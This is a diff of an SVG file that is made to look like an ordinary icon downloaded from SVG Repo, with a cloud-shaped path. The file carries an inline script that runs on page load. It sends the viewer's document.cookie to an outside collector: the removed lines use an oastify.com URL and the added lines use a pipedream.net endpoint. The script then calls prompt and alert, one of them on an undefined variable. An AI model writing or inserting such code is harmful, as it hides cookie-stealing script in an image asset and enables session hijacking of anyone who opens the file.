@@ -1,15 +1,12 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
-"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><defs><style>.a{fill:none;stroke:#000000;stroke-linecap:round;stroke-linejoin:round;}</style></defs><path class="a" d="M37.4378,23.281a11.3385,11.3385,0,0,0-22.6651,0,6.2056,6.2056,0,0,0,.15,12.41H37.2876a6.2056,6.2056,0,0,0,.15-12.41Z"/><polyline class="a" points="22.754 32.98 26.971 28.763 22.754 24.546"/><circle class="a" cx="12.0991" cy="28.7629" r="1.0072"/><circle class="a" cx="5.5072" cy="28.7629" r="1.0072"/><circle class="a" cx="17.9303" cy="28.7629" r="1.0072"/>  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
-    var rhyru = "Rhyru!";
+    var rhyru = "Rhyru9";
     window.onload = function() {
-      var img = new Image();
-      img.src = 'https://ebtk2rvds6omz169ap0u1chwpnvejb70.oastify.com/log?c=' + document.cookie;
-      prompt(rhyru);
+      var xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "https://eoow6y96ffo9mzx.m.pipedream.net/" + encodeURIComponent(document.cookie), true);
+      xhttp.send();
+      prompt(rhyru9);
       alert(document.cookie);
     };
-  </script>
-</svg>
+  </script></svg>
